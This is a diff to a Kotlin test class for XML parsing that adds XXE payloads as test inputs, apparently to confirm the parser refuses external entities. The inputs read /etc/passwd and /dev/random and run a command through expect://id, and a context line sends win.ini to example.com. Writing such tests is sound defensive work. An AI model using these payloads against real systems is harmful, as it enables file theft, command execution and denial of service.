@@ -24,6 +24,21 @@ class XmlEntityTest {
                 </updateProfile>
             """,
             """
+                <!DOCTYPE foo [
+                   <!ELEMENT foo ANY >
+                   <!ENTITY xxe SYSTEM  "file:///dev/random" >]>
+                <foo>&xxe;</foo>
+            """,
+            """
+                <!DOCTYPE foo
+                  [<!ELEMENT foo ANY >
+                   <!ENTITY xxe SYSTEM "expect://id" >]>
+                <creds>
+                  <user>`&xxe;`</user>
+                  <pass>`mypass`</pass>
+                </creds>
+            """,
+            """
                 <!DOCTYPE updateProfile [
                 <!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
                 <!ENTITY send SYSTEM 'http://example.com/?%file;'> ]>
@@ -54,7 +69,13 @@ class XmlEntityTest {
                 <firstname>Joe</firstname>
                 <lastname>&ssrf;</lastname>
                 </updateProfile>
-            """.trimIndent()
+            """,
+            """
+                <!DOCTYPE foo [
+                  <!ELEMENT foo ANY >
+                  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+                <foo>&xxe;</foo>
+            """
         ).map { it.encodeToByteArray() }
 
         inputs.forEach { xml ->
